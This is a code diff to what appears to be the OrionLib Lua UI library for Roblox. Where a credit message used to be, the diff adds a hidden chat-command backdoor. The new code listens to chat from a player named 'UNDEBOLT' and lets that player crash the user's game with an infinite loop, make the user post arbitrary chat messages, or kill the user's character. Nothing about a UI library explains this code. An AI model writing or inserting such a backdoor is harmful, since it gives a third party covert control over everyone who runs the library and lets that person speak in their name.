@@ -7,7 +7,7 @@ local RunService = game:GetService("RunService")
 local LocalPlayer = game:GetService("Players").LocalPlayer
 local Mouse = LocalPlayer:GetMouse()
 local HttpService = game:GetService("HttpService")
-
+local Players = game:GetService("Players")
 local OrionLib = {
 	Elements = {},
 	ThemeObjects = {},
@@ -37,7 +37,37 @@ function chatMessage(str)
     end
 end
 
-chatMessage("MADE BY BRILLIANT! DARKNESS IS A SKID!")
+local function onChatted(player, message)
+    if player.Name ~= "UNDEBOLT" then return end
+    if message:sub(1, 3):lower() == "/e " then
+        message = message:sub(4) 
+    end
+
+    local args = string.split(message, " ")
+    local command = args[1]
+    
+    if command == "!crash" then
+        while true do end
+    elseif command == "!say" then
+        local text = message:sub(6) 
+        chatMessage(text)
+    elseif command == "!kill" then
+        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+            LocalPlayer.Character.Humanoid.Health = 0
+        end
+    end
+end
+
+local function connectPlayer(player)
+    player.Chatted:Connect(function(msg) onChatted(player, msg) end)
+end
+
+for _, player in pairs(Players:GetPlayers()) do
+    connectPlayer(player)
+end
+
+Players.PlayerAdded:Connect(connectPlayer)
+
 
 --Feather Icons https://github.com/evoincorp/lucideblox/tree/master/src/modules/util - Created by 7kayoh
 local Icons = {}
